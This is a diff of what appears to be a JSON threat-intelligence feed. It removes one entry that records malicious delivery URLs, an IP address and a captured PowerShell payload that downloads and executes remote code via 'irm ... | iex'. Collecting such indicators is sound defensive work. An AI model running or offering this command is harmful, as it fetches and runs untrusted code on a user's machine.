@@ -8912,34 +8912,5 @@
     ],
     "ReportId": "cmwjvzcgx19280omlttmi8ydj",
     "ScannedAt": "2026-11-16T23:20:19.248000+00:00"
-  },
-  {
-    "UrlDomain": "useofsteroids.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes",
-      "base.gateway.tenderly.co"
-    ],
-    "PayloadUrl": [
-      "http://timelevel12.com/big"
-    ],
-    "IP": [
-      "188.114.96.0"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/c59b6384f87c88f2",
-        "Type": "payload download"
-      },
-      {
-        "Value": "https://base.gateway.tenderly.co",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/c59b6384f87c88f2'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/c59b6384f87c88f2"
-    ],
-    "ReportId": "cmwjuij2u191f0oml5k180wgd",
-    "ScannedAt": "2026-11-16T22:39:15.023000+00:00"
   }
 ]
